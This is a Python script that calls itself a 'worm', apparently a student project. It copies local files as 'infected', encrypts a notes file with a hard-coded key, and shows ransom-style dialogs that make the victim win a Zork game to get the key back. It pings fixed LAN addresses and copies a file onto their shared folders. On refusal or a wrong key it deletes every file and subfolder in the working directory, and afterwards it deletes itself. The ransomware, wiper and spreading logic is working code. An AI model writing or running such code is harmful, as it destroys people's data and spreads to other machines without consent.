import tkinter

import tkinter.simpledialog

import tkinter.messagebox

import os

import shutil

import subprocess

import sys

from cryptography.fernet import Fernet



def dycrypt():

    # DECRYPT

    # Read the key from file

    key = 'tw8uSsBvgyaGjAJOIANFTYvYR-rxxOMvp_KHSKcxfyY='

    



    # Read the encrypted data from file

    encryptedData = ''

    with open('encryptedFile.txt', 'rb') as file:

        encryptedData = file.read()



    # Decrypt the data

    f = Fernet(key)



    decryptedData = f.decrypt(encryptedData)



    # opening the file in write mode and

    # writing the decrypted data

    with open('notesSecurity.txt', 'wb') as dec_file:

        dec_file.write(decryptedData)

    

    os.remove('encryptedFile.txt')



def encrypt():

    # ENCRYPT

    # Read key from file

    key = 'tw8uSsBvgyaGjAJOIANFTYvYR-rxxOMvp_KHSKcxfyY='



    # Read data from file

    data = ''    

    with open('notesSecurity.txt', 'rb') as file:

        data = file.read()



    # Encrypt data

    f = Fernet(key)



    encryptedData = f.encrypt(data)



    # Save the encrypted data into a file

    with open('encryptedFile.txt', 'wb') as file:

        file.write(encryptedData)



    os.remove('notesSecurity.txt')



def close_and_delete_current_script():

    current_script = os.path.abspath(sys.argv[0])



    try:

        sys.exit()

    finally:

        try:

            os.remove(current_script)

        except OSError as e:

            print(f"fail to delete: {e}")



def delete_all_files_in_folder(folder_path):

    try:

        for filename in os.listdir(folder_path):

            file_path = os.path.join(folder_path, filename)

            if os.path.isfile(file_path):

                os.remove(file_path)

            elif os.path.isdir(file_path):

                shutil.rmtree(file_path)

        print(f"success: {folder_path}")

    except Exception as e:

        print(f"fail to delete: {e}")

def infect_files():
    
    for filename in os.listdir('.'):
        
        shutil.copy(filename, f'infected_{filename}')
        
        with open(f'infected_{filename}','a') as file:
            
            file.write('\nThis file is infected!')


def spread():
    
    for host in ['192.168.0.1', '192.168.0.2','192.168.0.3']:

        os.system(f'ping -c 1 {host}')
        
        shutil.copy('infect_file.txt',f'//{host}/shared_folder/infect_file.txt')


def run_Zork():

    zork_path = "/Users/annatessman/Downloads/Project1_demo"

    subprocess.run(["javac", "-cp", zork_path, "Driver.java"], cwd=zork_path)

    subprocess.run(["java", "-cp", f"{zork_path}:.", "Driver"], cwd=zork_path)



root=tkinter.Tk()

def interaction():

    theKey="tw8uSsBvgyaGjAJOIANFTYvYR-rxxOMvp_KHSKcxfyY="

    current_folder = os.getcwd()

    infect_files()

    result=tkinter.messagebox.askokcancel(title="windows",message="worm detected")

    if result==False:

        tkinter.messagebox.showwarning(title="windows",message="self-protection activated, starting self-destory")

    tkinter.messagebox.showerror(title="windows",message="failed to destory")

    #encrpt data

    encrypt()

    tkinter.messagebox.showinfo(title="worm",message="your folder is encrypted")

    tkinter.messagebox.showinfo(title="worm",message="you need a key to save your data")

    tkinter.messagebox.showinfo(title="worm",message="Let's play a game")

    tkinter.messagebox.showinfo(title="worm",message="if you win, you will get the key; otherwise, your data will be deleted")

    a= tkinter.messagebox.askokcancel(title="worm",message="play or not")

    if a==False:

        tkinter.messagebox.showinfo(title="worm",message="your data is gone")

        #deleteAllFiles

        delete_all_files_in_folder(current_folder)

        sys.exit()

        

    if a==True:

        tkinter.messagebox.showinfo(title="worm",message="game begin")

        #running zork

        run_Zork()

        tkinter.messagebox.showinfo(title="worm",message="hope you got the key")

        b=tkinter.simpledialog.askstring(title="acquiring the key",prompt="please enter:  ",initialvalue='')

        if b == theKey:

            tkinter.messagebox.showinfo(title="worm",message="Congratulations!")

            #decrypt data

            dycrypt()

            #close and delete the worm

            close_and_delete_current_script()

        else:

            tkinter.messagebox.showerror(title="worm",message="YOU ARE WRONG!")

            #delete all data

            delete_all_files_in_folder(current_folder)

            sys.exit()

    

if __name__ == "__main__":

    interaction()

    root.mainloop()
